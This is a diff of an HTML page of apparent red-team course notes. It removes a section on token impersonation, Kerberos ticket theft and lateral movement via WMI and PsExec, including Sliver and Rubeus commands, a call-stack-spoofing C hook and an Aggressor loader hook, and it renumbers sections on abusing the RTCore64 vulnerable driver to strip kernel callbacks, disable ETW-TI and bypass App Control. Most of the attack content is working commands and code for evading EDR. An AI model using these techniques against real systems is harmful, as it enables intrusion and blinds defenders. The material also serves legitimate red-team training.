@@ -42,28 +42,28 @@
   <meta name="twitter:image" content="./img/favicon.png">
   <style>
   /* Index sidebar color flow (light teal → dark teal) */
-  .section-flow-1{background-color:#f0f8f7;}
-  .section-flow-1 .dropdown-container,.section-flow-1 .nested-dropdown-container{background-color:#f0f8f7;}
-  .section-flow-2{background-color:#c5e8e5;}
-  .section-flow-2 .dropdown-container,.section-flow-2 .nested-dropdown-container{background-color:#c5e8e5;}
-  .section-flow-3{background-color:#8dd1ce;}
-  .section-flow-3 .dropdown-container,.section-flow-3 .nested-dropdown-container{background-color:#8dd1ce;}
-  .section-flow-4{background-color:#4fb5b1;}
-  .section-flow-4 .dropdown-container,.section-flow-4 .nested-dropdown-container{background-color:#4fb5b1;}
-  .section-flow-5{background-color:#208f8b;}
-  .section-flow-5 .dropdown-container,.section-flow-5 .nested-dropdown-container{background-color:#208f8b;}
-  .section-flow-6{background-color:#0d5f5c;}
-  .section-flow-6 .dropdown-container,.section-flow-6 .nested-dropdown-container{background-color:#0d5f5c;}
-  .section-flow-7{background-color:#0a4a47;}
-  .section-flow-7 .dropdown-container,.section-flow-7 .nested-dropdown-container{background-color:#0a4a47;}
-  .section-flow-8{background-color:#083a38;}
-  .section-flow-8 .dropdown-container,.section-flow-8 .nested-dropdown-container{background-color:#083a38;}
-  .section-flow-9{background-color:#062b29;}
-  .section-flow-9 .dropdown-container,.section-flow-9 .nested-dropdown-container{background-color:#062b29;}
-  .section-flow-10{background-color:#052320;}
-  .section-flow-10 .dropdown-container,.section-flow-10 .nested-dropdown-container{background-color:#052320;}
-  .section-flow-11{background-color:#031916;}
-  .section-flow-11 .dropdown-container,.section-flow-11 .nested-dropdown-container{background-color:#031916;}
+  .section-flow-1{background-color:#f3f6f7;}
+  .section-flow-1 .dropdown-container,.section-flow-1 .nested-dropdown-container{background-color:#f3f6f7;}
+  .section-flow-2{background-color:#afd0d9;}
+  .section-flow-2 .dropdown-container,.section-flow-2 .nested-dropdown-container{background-color:#afd0d9;}
+  .section-flow-3{background-color:#6dbacd;}
+  .section-flow-3 .dropdown-container,.section-flow-3 .nested-dropdown-container{background-color:#6dbacd;}
+  .section-flow-4{background-color:#34adcb;}
+  .section-flow-4 .dropdown-container,.section-flow-4 .nested-dropdown-container{background-color:#34adcb;}
+  .section-flow-5{background-color:#2597b3;}
+  .section-flow-5 .dropdown-container,.section-flow-5 .nested-dropdown-container{background-color:#2597b3;}
+  .section-flow-6{background-color:#1e8ba6;}
+  .section-flow-6 .dropdown-container,.section-flow-6 .nested-dropdown-container{background-color:#1e8ba6;}
+  .section-flow-7{background-color:#1e8ba6;}
+  .section-flow-7 .dropdown-container,.section-flow-7 .nested-dropdown-container{background-color:#1e8ba6;}
+  .section-flow-8{background-color:#2597b3;}
+  .section-flow-8 .dropdown-container,.section-flow-8 .nested-dropdown-container{background-color:#2597b3;}
+  .section-flow-9{background-color:#34adcb;}
+  .section-flow-9 .dropdown-container,.section-flow-9 .nested-dropdown-container{background-color:#34adcb;}
+  .section-flow-10{background-color:#6dbacd;}
+  .section-flow-10 .dropdown-container,.section-flow-10 .nested-dropdown-container{background-color:#6dbacd;}
+  .section-flow-11{background-color:#afd0d9;}
+  .section-flow-11 .dropdown-container,.section-flow-11 .nested-dropdown-container{background-color:#afd0d9;}
   </style>
 </head>
 
@@ -5306,180 +5306,11 @@ Guid
 ----
 8ab6880f-1f83-4d40-a331-3d4164d25eb1</code></pre>
 
-<h2 id="crtl-lateral-movement-6">6. User Impersonation &amp; Lateral Movement</h2>
-
-<h3 id="crtl-user-impersonation">6.1 User Impersonation</h3>
-<p>RTO covered multiple user impersonation techniques, but not all of them are viable in a modern EDR world.</p>
-
-<h4 id="crtl-lateral-make-token-createnetonly">6.1.1 make_token / createnetonly</h4>
-<p>Both commands clone the current token and attach new credentials for outbound connections, but go through different APIs:</p>
-<table class="custom-table">
-<thead><tr><th>Command</th><th>API</th><th>Logon type</th></tr></thead>
-<tbody>
-<tr><td>Beacon <code>make_token</code></td><td><code>LogonUserA</code></td><td><code>LOGON32_LOGON_NEW_CREDENTIALS</code></td></tr>
-<tr><td>Rubeus <code>createnetonly</code></td><td><code>CreateProcessWithLogonW</code></td><td><code>LOGON_NETCREDENTIALS_ONLY</code></td></tr>
-</tbody>
-</table>
-<p>Both generate logon events tagged with the calling process. Running <code>make_token</code> from a Beacon hosted outside <code>System32</code> or <code>Program Files</code> is suspicious; Rubeus' <code>/process</code> argument gives you control over the host process, which is easier to blend in. For maximum blend, target a process like <code>runas.exe</code> that legitimately produces these logon events by design.</p>
-<p><strong>Sliver equivalent:</strong> Sliver exposes both forms natively:</p>
-<pre><code class="language-bash">sliver (SESSION) &gt; make-token -u contoso\\rsteel -p Passw0rd! -d contoso.com
-# Token created, outbound auth now uses these creds
-
-sliver (SESSION) &gt; runas -u contoso\\rsteel -p Passw0rd! -P c:\\windows\\system32\\cmd.exe -a "/c whoami"
-# CreateProcessWithLogonW equivalent &mdash; spawns a new process under the target user
-
-sliver (SESSION) &gt; rev2self
-# Drops the impersonated token</code></pre>
-
-<h4 id="crtl-lateral-steal-token">6.1.2 steal_token</h4>
-<p>There's often no problem with stealing and impersonating the primary access token of other processes, as long as we can call the underlying APIs (<code>OpenProcess</code>, <code>OpenProcessToken</code>, <code>DuplicateToken</code>, <code>ImpersonateLoggedOnUser</code>) in an OPSEC-safe way. That may involve call stack spoofing, API unhooking, or syscalls, depending on the EDR you're up against.</p>
-<p><strong>Sliver equivalent:</strong> <code>impersonate</code> takes a target username and finds an existing logon session for them, then duplicates and impersonates that token. Drop with <code>rev2self</code>:</p>
-<pre><code class="language-bash">sliver (SESSION) &gt; impersonate contoso\\Administrator
-sliver (SESSION) &gt; rev2self</code></pre>
-
-<h4 id="crtl-lateral-kerberos">6.1.3 Kerberos</h4>
-<p>Most techniques like <code>asktgt</code>, <code>asktgs</code>, and <code>s4u</code> abuse (where raw Kerberos traffic is generated directly by the tool) are not possible against EDRs that monitor network traffic. On Windows, the only native process that normally generates Kerberos traffic from a domain joined host is <code>lsass.exe</code>, although there are some exceptions like <code>AzureADConnect.exe</code>.</p>
-<p>Dumping tickets and passing them into another logon session still works fine, as these actions don't touch LSASS directly, nor generate Kerberos traffic. However, there are other heavy restrictions on Kerberos tradecraft on modern hosts, which are discussed in the Credential Guard chapter.</p>
-<p><strong>Sliver equivalent:</strong> Sliver doesn't have native Kerberos tradecraft, but Rubeus is one armory install away and runs in-memory:</p>
-<pre><code class="language-bash">sliver &gt; armory install rubeus
-sliver (SESSION) &gt; rubeus triage
-sliver (SESSION) &gt; rubeus dump /luid:0x422abf /service:cifs /nowrap
-sliver (SESSION) &gt; rubeus ptt /ticket:doIGZ...
-
-# Same OPSEC problem as on CS &mdash; raw Kerberos traffic from a non-LSASS process is a red flag.</code></pre>
-
-<h3 id="crtl-lateral-movement">6.2 Lateral Movement</h3>
-
-<h4 id="crtl-lateral-wmi">6.2.1 WMI</h4>
-<p>The <code>remote-exec wmi</code> command is implemented as a BOF that calls <code>combase.dll!CoCreateInstance</code> to instantiate the COM object for remote WMI. That triggers a load-library event for <code>wbemprox.dll</code>, and because BOFs run from unbacked memory, the load looks like this:</p>
-<pre><code class="language-bash">C:\Windows\System32\KernelBase.dll!LoadLibraryExW+0xe6
-C:\Windows\System32\combase.dll!CoReleaseServerProcess+0xee9
-C:\Windows\System32\combase.dll!CoReleaseServerProcess+0x9b0
-C:\Windows\System32\combase.dll!CoReleaseServerProcess+0x24ce
-C:\Windows\System32\combase.dll!CoCreateFreeThreadedMarshaler+0x67f1
-C:\Windows\System32\combase.dll!CoReleaseServerProcess+0x391
-C:\Windows\System32\combase.dll!CoCancelCall+0x1e65
-C:\Windows\System32\combase.dll!HSTRING_UserSize64+0x80d
-C:\Windows\System32\combase.dll!InternalCAggIdRelease+0x727
-C:\Windows\System32\combase.dll!CoRevokeDeviceCatalog+0x1297
-C:\Windows\System32\combase.dll!InternalCAggIdRelease+0x155d
-C:\Windows\System32\combase.dll!CStdStubBuffer_AddRef+0xfe1
-C:\Windows\System32\combase.dll!IsErrorPropagationEnabled+0x58e
-C:\Windows\System32\combase.dll!HSTRING_UserSize64+0x80d
-C:\Windows\System32\combase.dll!CoWaitForMultipleHandles+0x775e
-C:\Windows\System32\combase.dll!HSTRING_UserSize64+0x80d
-C:\Windows\System32\combase.dll!CoCreateFreeThreadedMarshaler+0x4722
-C:\Windows\System32\combase.dll!CoCreateFreeThreadedMarshaler+0x355b
-C:\Windows\System32\combase.dll!CoCreateInstance+0x120
-Unbacked+0x124</code></pre>
-<p>Beacon's BOF loader uses <code>LoadLibraryA</code> and <code>GetProcAddress</code> to resolve a BOF's imports, and since the PICO already hooks both, we can redirect the <code>CoCreateInstance</code> call through call stack spoofing. Add the hook to <code>hooks.c</code>:</p>
-<pre><code class="language-c">#include &lt;combaseapi.h&gt;
-
-DECLSPEC_IMPORT HRESULT WINAPI OLE32$CoCreateInstance ( REFCLSID, LPUNKNOWN, DWORD, REFIID, LPVOID * );
-
-HRESULT WINAPI _CoCreateInstance ( REFCLSID rclsid, LPUNKNOWN pUnkOuter, DWORD dwClsContext, REFIID riid, LPVOID * ppv )
-{
-    FUNCTION_CALL call = { 0 };
-
-    call.ptr  = ( PVOID ) ( OLE32$CoCreateInstance );
-    call.argc = 5;
-
-    call.args [ 0 ] = spoof_arg ( rclsid );
-    call.args [ 1 ] = spoof_arg ( pUnkOuter );
-    call.args [ 2 ] = spoof_arg ( dwClsContext );
-    call.args [ 3 ] = spoof_arg ( riid );
-    call.args [ 4 ] = spoof_arg ( ppv );
-
-    return ( HRESULT ) spoof_call ( &amp;call );
-}</code></pre>
-<p>And the corresponding entry in <code>pico.spec</code>:</p>
-<pre><code class="language-bash">addhook "OLE32$CoCreateInstance" "_CoCreateInstance"</code></pre>
-<p>For the executable side of <code>remote-exec wmi</code>, upload the payload somewhere that already contains binaries (e.g. <code>System32</code> or <code>Program Files</code>). Executing payloads from atypical directories is itself a detection.</p>
-<p><strong>Sliver equivalent:</strong> Sliver ships built-in WMI execution and a separate WMI-based implant deploy. The same unbacked-memory call stack issue applies if you run it from a non-implant process:</p>
-<pre><code class="language-bash">sliver (SESSION) &gt; wmi -H lon-dc-1 -u contoso\\rsteel -p Passw0rd! "cmd.exe /c whoami &gt; c:\\temp\\out.txt"
-
-# Or stage a new implant on a remote target via WMI
-sliver (SESSION) &gt; psexec -s "MyService" -d "Update Service" -c \\\\lon-dc-1\\admin$\\implant.exe lon-dc-1
-# (psexec in Sliver works for WMI too via --wmi flag in newer builds)</code></pre>
-
-<h5 id="crtl-lateral-suspicious-unsigned-execution-via-network-logon-wmi">Suspicious/Unsigned execution via network logon</h5>
-<p>EDRs will almost certainly flag a recently-created file being executed via a network logon. The "recently" window varies by vendor. Some workarounds:</p>
-<ul>
-<li>Upload the payload, wait a while, then run it.</li>
-<li>Use a LOLBAS to launch it indirectly &mdash; <code>cmd /c C:\Windows\System32\smb.exe</code> instead of <code>C:\Windows\System32\smb.exe</code> directly.</li>
-<li>Code-sign the payload.</li>
-</ul>
-
-<h4 id="crtl-lateral-psexec">6.2.2 PsExec</h4>
-<p>The use of PsExec is usually detected due to a service being created with a UNC <code>binPath</code>, such as <code>\\[target]\ADMIN$\foo.exe</code>. This is the behaviour of Beacon's built-in <code>jump psexec[64]</code> command. You could write a custom Aggressor script to use <code>C:\Windows\</code> (or some other directory) instead; or an alternate technique like SCShell, as this already uses <code>System32</code>. You could also upload the payload manually and execute it using <code>remote-exec psexec</code> (but don't forget to delete it afterwards). Remember that the service payload is the only one that performs remote injection. You will therefore certainly want to load the Artifact Kit to control the <code>spawnto</code>, etc.</p>
-<p><strong>Sliver equivalent:</strong> Sliver's <code>psexec</code> creates a Windows service on the target and points it at an implant binary you upload. Same UNC-binPath signature applies. Mitigation: upload to a non-UNC path first, then point the service at the local copy:</p>
-<pre><code class="language-bash"># Default behaviour (UNC binPath &mdash; signatured)
-sliver (SESSION) &gt; psexec -s "WinUpdate" -d "Windows Update Service" lon-dc-1
-
-# Upload first, then point the service at a local path
-sliver (SESSION) &gt; upload /tmp/implant.exe \\\\lon-dc-1\\c$\\windows\\system32\\winupdate.exe
-sliver (SESSION) &gt; execute -t -o sc.exe \\\\lon-dc-1 create WinUpdate binPath= "C:\\windows\\system32\\winupdate.exe" start= demand
-sliver (SESSION) &gt; execute -t -o sc.exe \\\\lon-dc-1 start WinUpdate
-
-# Or use SCShell-style technique via an extension
-sliver &gt; armory install scshell</code></pre>
-
-<h3 id="crtl-lateral-beacon-rdll-generate-local">6.3 BEACON_RDLL_GENERATE_LOCAL</h3>
-<p><code>BEACON_RDLL_GENERATE_LOCAL</code> is the in-Beacon analogue of <code>BEACON_RDLL_GENERATE</code>. The UI-side hook fires when a payload is generated from the team server UI; the LOCAL variant fires when a Beacon command like <code>spawn</code> or <code>spawnas</code> needs to produce a payload on the fly.</p>
-<p>It receives the same arguments as the UI hook, plus two extras:</p>
-<table class="custom-table">
-<thead><tr><th>Arg</th><th>Value</th></tr></thead>
-<tbody>
-<tr><td><code>$5</code></td><td>Pointer to <code>GetModuleHandleA</code></td></tr>
-<tr><td><code>$6</code></td><td>Pointer to <code>GetProcAddress</code></td></tr>
-</tbody>
-</table>
-<p>These pointers are resolved by the parent Beacon and sent to the team server in metadata. They exist so they can be patched into the reflective loader, saving it from having to walk the EAT itself. Whether you use them depends on the defences in play &mdash; API calls from the loader will still be unbacked, so to actually benefit you'd need to wrap them in stack spoofing.</p>
-<p>The lab version of Crystal Kit doesn't support these pointers. Because Beacon's IAT is hooked through the PICO, the <code>GetModuleHandleA</code>/<code>GetProcAddress</code> pointers it resolves point at our PICO hook functions, not the real APIs. A patched loader using them crashes.</p>
-<p>Regardless of whether you use the pointers or not, the hook still needs to be registered in an Aggressor script. If you don't, any Beacon generated through one of these commands will not have any of our evasion tradecraft applied to it, and you'll effectively be running a vanilla Beacon. The code inside the hook can just be copy/pasted from the BEACON_RDLL_GENERATE hook:</p>
-<pre><code class="language-javascript">set BEACON_RDLL_GENERATE_LOCAL
-{
-    local ( '$beacon $arch $spec_path $spec $final' );
-    
-    $beacon = $2;
-    $arch   = $3;
-  
-    if ( $arch eq "x86" )
-    {
-        warn ( "Crystal Kit is x64 only" );
-        return $null;
-    }
-  
-    print_info ( "BEACON_RDLL_GENERATE_LOCAL" );
-  
-    $beacon = strrep_pad ( $beacon, "beacon.x64.dll", "bacon.x64.dll" );
-    $beacon = strrep_pad ( $beacon, "%02d/%02d/%02d", "%02d/%02d/%04d" );
-    $beacon = strrep_pad ( $beacon, "%s as %s\%s: %d", "%s - %s\%s (%d)" );
-    $beacon = strrep_pad ( $beacon, "\x48\x89\x5C\x24\x08\x57\x48\x83\xEC\x20\x48\x8B\x59\x10\x48\x8B\xF9\x48\x8B\x49\x08\xFF\x17\x33\xD2\x41\xB8\x00\x80\x00\x00", "\x48\x89\x5C\x24\x08\x57\x48\x83\xEC\x20\x48\x8B\x59\x10\x48\x8B\xF9\x48\x8B\x49\x08\xFF\x17\x33\xD2\x41\xB8\x01\x80\x00\x00" );
-  
-    # get path to spec file
-    $spec_path = getFileProper ( script_resource ( "udrl" ), "loader.spec" );
-  
-    # parse the spec
-    $spec = [ LinkSpec Parse: $spec_path ];
-  
-    # apply the spec
-    $final = [ $spec run: $beacon, [ new HashMap ] ];
-  
-    if ( strlen ( $final ) == 0 )
-    {
-        warn ( "Failed to build payload" );
-        return $null;
-    }
-  
-    return $final;
-}</code></pre>
-
-<h2 id="crtl-kernel-protections-7">7. Vulnerable Drivers</h2>
+<h2 id="crtl-kernel-protections-7">6. Kernel-Mode Bypasses</h2>
 <p>EDR telemetry like kernel callbacks and ETW-TI is generated from kernel memory. To disable it, we need to write to kernel memory &mdash; which can only be done from a kernel-mode driver. Writing our own driver isn't viable because of <strong>Driver Signature Enforcement (DSE)</strong>, which blocks unsigned drivers from loading.</p>
 <p>The realistic option is to abuse a legitimate driver that's either vulnerable to code execution in the kernel, or just badly designed and exposes IOCTLs for arbitrary kernel memory read/write. <a href="https://www.loldrivers.io">LOLDrivers</a> catalogues these. You can enumerate a target to see if a vulnerable driver is already installed, or install one yourself (local admin only).</p>
 
-<h3 id="crtl-vulndrv-rtcore64">7.1 RTCore64</h3>
+<h3 id="crtl-vulndrv-rtcore64">6.1 RTCore64</h3>
 <p><code>RTCore64.sys</code> ships with MSI Afterburner (GPU overclocking software) and exposes two IOCTLs to user mode: one for arbitrary kernel memory read, one for arbitrary kernel memory write. Those two primitives are enough to disable most kernel-resident protections.</p>
 <p>The request payload uses a fixed structure with padding around the address, write size, and value:</p>
 <pre><code class="language-c">struct RTCORE64_MEMORY {
@@ -5529,7 +5360,7 @@ DeviceIoControl(
     NULL);</code></pre>
 <p>Other vulnerable drivers have their own IOCTL codes, data formats, quirks, and limitations &mdash; you have to talk to each one the way it expects.</p>
 
-<h3 id="crtl-vulndrv-driver-bofs">7.2 Driver BOFs</h3>
+<h3 id="crtl-vulndrv-driver-bofs">6.2 Driver BOFs</h3>
 <p>I've packaged kernel abuses as BOFs under the "Kernel Tradecraft" command group. Load the RTCore driver first, then use the BOFs:</p>
 <pre><code class="language-bash">beacon&gt; help
 
@@ -5559,7 +5390,7 @@ SERVICE_NAME: RTCore64
         PID                : 0
         FLAGS              :</code></pre>
 
-<h4 id="crtl-vulndrv-suspicious-ntoskrnl-image-loads">7.2.1 Suspicious ntoskrnl image loads</h4>
+<h4 id="crtl-vulndrv-suspicious-ntoskrnl-image-loads">6.2.1 Suspicious ntoskrnl image loads</h4>
 <p>Most kernel tradecraft needs the addresses of structures inside the kernel image &mdash; callback lists, ETW provider tables, etc. The standard approach is to load <code>ntoskrnl.exe</code> into the current process, scan it for a known instruction pattern, extract the relative offset, and add it to the kernel's base address to get the real kernel-memory location.</p>
 <p>The registry-callback removal does exactly that:</p>
 <ol>
@@ -5569,10 +5400,10 @@ SERVICE_NAME: RTCore64
 <li>Extract the RVA from the <code>lea</code> operand.</li>
 </ol>
 <p>Some EDRs alert when the kernel image is loaded into a process. Running the BOF inside a Microsoft-signed executable defeats some of them. For more aggressive EDRs, skip the image load entirely and use a pre-calculated offset table keyed by kernel version.</p>
-<h3 id="crtl-vulndrv-disabling-kernel-telemetry">7.3 Disabling Kernel Telemetry</h3>
+<h3 id="crtl-vulndrv-disabling-kernel-telemetry">6.3 Disabling Kernel Telemetry</h3>
 <p>This section walks through using RTCore64 and the kernel BOFs to disable specific kernel-resident protections and telemetry.</p>
 
-<h3 id="crtl-vulndrv-kernel-callbacks">7.4 Kernel callbacks</h3>
+<h3 id="crtl-vulndrv-kernel-callbacks">6.4 Kernel callbacks</h3>
 <p><code>list_callbacks</code> dumps all process, thread, image-load, handle-op, and registry callbacks registered with the kernel. The output shows which driver owns each entry:</p>
 <pre><code class="language-bash">beacon&gt; list_callbacks
 [*] Tasked Beacon to list kernel callbacks
@@ -5664,7 +5495,7 @@ Process Callbacks
 [9] 0xFFFFF8003FB2CC10 (KslD.sys)
 [10] 0xFFFFF8003FAD1B80 (wtd.sys)</code></pre>
 
-<h3 id="crtl-vulndrv-etw-ti">7.5 ETW-TI</h3>
+<h3 id="crtl-vulndrv-etw-ti">6.5 ETW-TI</h3>
 <p><code>etw_enum</code> takes an ETW provider GUID, locates it in the relevant hash bucket, and returns the value of the <code>IsEnabled</code> field. <code>etw_disable</code> patches <code>IsEnabled</code> to <code>0x0</code> to silence it:</p>
 <pre><code class="language-bash">beacon&gt; etw_enum {F4E1897C-BB5D-5668-F1D8-040F4D8DD344}
 [*] Tasked Beacon to enum ETW-TI provider
@@ -5679,7 +5510,7 @@ beacon&gt; etw_enum {F4E1897C-BB5D-5668-F1D8-040F4D8DD344}
 
 ProviderEnableInfo.IsEnabled == 0</code></pre>
 
-<h3 id="crtl-vulndrv-protected-processes">7.6 Protected Processes</h3>
+<h3 id="crtl-vulndrv-protected-processes">6.6 Protected Processes</h3>
 <p><strong>Protected Processes (PP)</strong> launched in Windows Vista as a DRM enforcement mechanism. The kernel restricts what access rights a non-protected process can obtain to a protected one &mdash; even an admin calling <code>OpenProcess</code> with <code>PROCESS_ALL_ACCESS</code> gets a handle with the sensitive rights (<code>PROCESS_VM_OPERATION</code>, <code>PROCESS_VM_READ</code>, <code>PROCESS_TERMINATE</code>, etc.) stripped out.</p>
 <p><strong>Protected Process Light (PPL)</strong> extended this with a hierarchical signer model. Higher signer levels can access lower ones but not vice versa. The protection level for a process is stored in <code>EPROCESS-&gt;Protection</code> as a <code>_PS_PROTECTION</code> struct:</p>
 <pre><code class="language-c">struct _PS_PROTECTION {
@@ -5720,7 +5551,7 @@ Audit  : 0
 Type   : PsProtectedTypeNone
 Signer : PsProtectedSignerNone</code></pre>
 
-<h2 id="crtl-app-control-8">8. App Control for Business</h2>
+<h2 id="crtl-app-control-8">7. WDAC Bypass</h2>
 <p><strong>App Control for Business</strong> is Windows' kernel-enforced application allow-listing. It restricts which executables, scripts, and drivers can run via a software-restriction policy. Compared to AppLocker:</p>
 <table class="custom-table">
 <thead><tr><th>Feature</th><th>AppLocker</th><th>App Control</th></tr></thead>
@@ -5731,7 +5562,7 @@ Signer : PsProtectedSignerNone</code></pre>
 </tbody>
 </table>
 
-<h3 id="crtl-appcontrol-app-control-policies">8.1 App Control policies</h3>
+<h3 id="crtl-appcontrol-app-control-policies">7.1 App Control policies</h3>
 <p>App Control rules can match on:</p>
 <ul>
 <li>The path where the app exists on disk.</li>
@@ -5742,7 +5573,7 @@ Signer : PsProtectedSignerNone</code></pre>
 <p>Policies start as XML, authored with <code>New-CIPolicy</code> or the App Control for Business Wizard. The common pattern is a single base policy (allowing core Windows components, store apps, Office 365, WHQL drivers) plus one or more supplemental policies for third-party and LOB applications.</p>
 <p>Since Windows 10 1903 / Server 2022, admins can deploy multiple policies side-by-side &mdash; including both enforced and audit policies simultaneously. The raw XML is compiled to <code>.cip</code> (Code Integrity Policy) binary format and copied to <code>C:\Windows\System32\CodeIntegrity\CIPolicies\Active</code> to take effect.</p>
 
-<h3 id="crtl-appcontrol-wdactools">8.2 WDACTools</h3>
+<h3 id="crtl-appcontrol-wdactools">7.2 WDACTools</h3>
 <p>Matt Graeber's <strong>WDACTools</strong> PowerShell module builds, configures, deploys, and audits WDAC / App Control policies. The schema isn't 100% current, but it's the practical analysis option &mdash; App Control puts PowerShell in constrained language mode, so analyse <code>.cip</code> files offline. <code>ConvertTo-WDACCodeIntegrityPolicy</code> reverses a binary <code>.cip</code> back to XML:</p>
 <pre><code class="language-powershell">PS C:\Users\Attacker\Desktop\CIPs&gt; ipmo C:\Tools\WDACTools\WDACTools.psd1
 PS C:\Users\Attacker\Desktop\CIPs&gt; ConvertTo-WDACCodeIntegrityPolicy -BinaryFilePath '.\{e01193e3-74ca-4f99-83d7-1a9522374b3f}.CIP' -XmlFilePath '.\{e01193e3-74ca-4f99-83d7-1a9522374b3f}.xml'</code></pre>
@@ -5750,7 +5581,7 @@ PS C:\Users\Attacker\Desktop\CIPs&gt; ConvertTo-WDACCodeIntegrityPolicy -BinaryF
 <pre><code class="language-xml">&lt;PolicyID&gt;{E01193E3-74CA-4F99-83D7-1A9522374B3F}&lt;/PolicyID&gt;
 &lt;BasePolicyID&gt;{E01193E3-74CA-4F99-83D7-1A9522374B3F}&lt;/BasePolicyID&gt;</code></pre>
 
-<h3 id="crtl-appcontrol-rule-options">8.3 Rule options</h3>
+<h3 id="crtl-appcontrol-rule-options">7.3 Rule options</h3>
 <p>Rule options control policy-wide behaviour. They appear as an <code>&lt;Option&gt;</code> entry inside <code>&lt;Rules&gt;</code>:</p>
 <pre><code class="language-xml">&lt;Rules&gt;
   &lt;Rule&gt;
@@ -5771,25 +5602,25 @@ PS C:\Users\Attacker\Desktop\CIPs&gt; ConvertTo-WDACCodeIntegrityPolicy -BinaryF
 </tbody>
 </table>
 
-<h4 id="crtl-appcontrol-audit-mode">8.3.1 Audit Mode</h4>
+<h4 id="crtl-appcontrol-audit-mode">7.3.1 Audit Mode</h4>
 <p>Logs what would have been blocked instead of blocking it. The default for new policies.</p>
 
-<h4 id="crtl-appcontrol-umci">8.3.2 UMCI</h4>
+<h4 id="crtl-appcontrol-umci">7.3.2 UMCI</h4>
 <p>User-Mode Code Integrity. Restricts both kernel-mode and user-mode binaries. Disabling it restricts only drivers.</p>
 
-<h4 id="crtl-appcontrol-unsigned-system-integrity-policy">8.3.3 Unsigned System Integrity Policy</h4>
+<h4 id="crtl-appcontrol-unsigned-system-integrity-policy">7.3.3 Unsigned System Integrity Policy</h4>
 <p>Allows the policy file itself to remain unsigned. Enabled by default. Disabling forces a trusted-CA signature on policy files.</p>
 
-<h4 id="crtl-appcontrol-update-policy-no-reboot">8.3.4 Update Policy No Reboot</h4>
+<h4 id="crtl-appcontrol-update-policy-no-reboot">7.3.4 Update Policy No Reboot</h4>
 <p>Lets policy updates apply without rebooting.</p>
 
-<h4 id="crtl-appcontrol-runtime-filepath-rule-protection">8.3.5 Runtime FilePath Rule Protection</h4>
+<h4 id="crtl-appcontrol-runtime-filepath-rule-protection">7.3.5 Runtime FilePath Rule Protection</h4>
 <p>Enabled by default. Performs a runtime writability check on FilePath-rule paths &mdash; if a non-admin can write there, execution from the path is denied even though it's allow-listed.</p>
 
-<h4 id="crtl-appcontrol-dynamic-code-security">8.3.6 Dynamic Code Security</h4>
+<h4 id="crtl-appcontrol-dynamic-code-security">7.3.6 Dynamic Code Security</h4>
 <p>Disabled by default. When enabled, enforces the policy for .NET and other dynamic-runtime code &mdash; blocks tools like <code>Microsoft.Workflow.Compiler</code> and MSBuild for code execution.</p>
 
-<h3 id="crtl-appcontrol-default-signers-and-ekus">8.4 Default signers and EKUs</h3>
+<h3 id="crtl-appcontrol-default-signers-and-ekus">7.4 Default signers and EKUs</h3>
 <p>Base policies typically allow Microsoft's default Windows certificates. The challenge with analysing reversed XML is that signer names aren't preserved &mdash; the original might be:</p>
 <pre><code class="language-xml">&lt;Signer Name="MincryptKnownRootMicrosoftProductRoot1997" ID="ID_SIGNER_MICROSOFT_PRODUCT_1997"&gt;
   &lt;CertRoot Type="Wellknown" Value="04" /&gt;
@@ -5804,7 +5635,7 @@ PS C:\Users\Attacker\Desktop\CIPs&gt; ConvertTo-WDACCodeIntegrityPolicy -BinaryF
 &lt;/EKUs&gt;</code></pre>
 <p>So a reasonable assumption from these snippets is "all Microsoft-signed binaries plus Windows Store".</p>
 
-<h3 id="crtl-appcontrol-supplemental-policies">8.5 Supplemental policies</h3>
+<h3 id="crtl-appcontrol-supplemental-policies">7.5 Supplemental policies</h3>
 <p>Supplemental policies extend a base policy with additional allow rules. Their <code>BasePolicyID</code> points at the base they extend. For example, allowing <code>7zFM.exe</code> from <code>Program Files</code>:</p>
 <pre><code class="language-xml">&lt;PolicyID&gt;{C3C533E1-8D36-41E5-BD04-7E096BCE1C8D}&lt;/PolicyID&gt;
 &lt;BasePolicyID&gt;{E01193E3-74CA-4F99-83D7-1A9522374B3F}&lt;/BasePolicyID&gt;
@@ -5815,20 +5646,20 @@ PS C:\Users\Attacker\Desktop\CIPs&gt; ConvertTo-WDACCodeIntegrityPolicy -BinaryF
 ...</code></pre>
 <p>Supplemental policies only support allow rules. Deny rules must live in a base policy.</p>
 
-<h3 id="crtl-appcontrol-deny-rules">8.6 Deny rules</h3>
+<h3 id="crtl-appcontrol-deny-rules">7.6 Deny rules</h3>
 <p>Deny rules go in the base policy and always take precedence over allow rules &mdash; useful for blocking specific binaries even if the broader signer rule would allow them. This blocks <code>regedit.exe</code> and any <code>RefreshPolicy.exe</code> below version 10.0.19042.0:</p>
 <pre><code class="language-xml">&lt;FileRules&gt;
   &lt;Deny ID="ID_DENY_D_0001" FilePath="%WINDIR%\regedit.exe"/&gt;
   &lt;FileAttrib ID="ID_FILEATTRIB_F_0002" FileName="RefreshPolicy.exe" MinimumFileVersion="10.0.19042.0"/&gt;
 &lt;/FileRules&gt;</code></pre>
 
-<h3 id="crtl-appcontrol-policy-misconfigurations">8.7 Policy Misconfigurations</h3>
+<h3 id="crtl-appcontrol-policy-misconfigurations">7.7 Policy Misconfigurations</h3>
 <p>App Control is an official security boundary, so direct technique bypasses are patched quickly and have short shelf-lives. The reliable approach is misconfiguration &mdash; gaps in admin-deployed policies.</p>
 
-<h3 id="crtl-appcontrol-audit-only-policies">8.8 Audit-only policies</h3>
+<h3 id="crtl-appcontrol-audit-only-policies">7.8 Audit-only policies</h3>
 <p>Microsoft recommends deploying policies in audit mode first to gauge business impact, then switching to enforce. The default for newly-authored policies is audit, and admins regularly forget to flip the switch. You'll find environments running real policies in audit only &mdash; activity is logged, but nothing is blocked.</p>
 
-<h3 id="crtl-appcontrol-file-attributes">8.9 File attributes</h3>
+<h3 id="crtl-appcontrol-file-attributes">7.9 File attributes</h3>
 <p>File rules can match on attributes (<code>OriginalFileName</code>, <code>ProductName</code>) instead of path or hash &mdash; useful for installers and portable apps without a fixed location. For example:</p>
 <pre><code class="language-xml">&lt;FileRules&gt;
   &lt;Allow ID="ID_ALLOW_A_1" FriendlyName="Allow 7Zip installer" FileName="7zipInstall.exe" ProductName="7-Zip"/&gt;
@@ -5894,7 +5725,7 @@ IDI_ICON1               ICON                    "src-main/7zip.ico"</code></pre>
 <p>Rebuild the kit and reload the Aggressor script. New executable payloads will carry the matching file attributes:</p>
 <pre><code class="language-bash">$ ./build.sh mailslot HeapAlloc 344564 0 true false none /mnt/c/Tools/cobaltstrike/artifacts</code></pre>
 
-<h3 id="crtl-appcontrol-path-wildcards">8.10 Path wildcards</h3>
+<h3 id="crtl-appcontrol-path-wildcards">7.10 Path wildcards</h3>
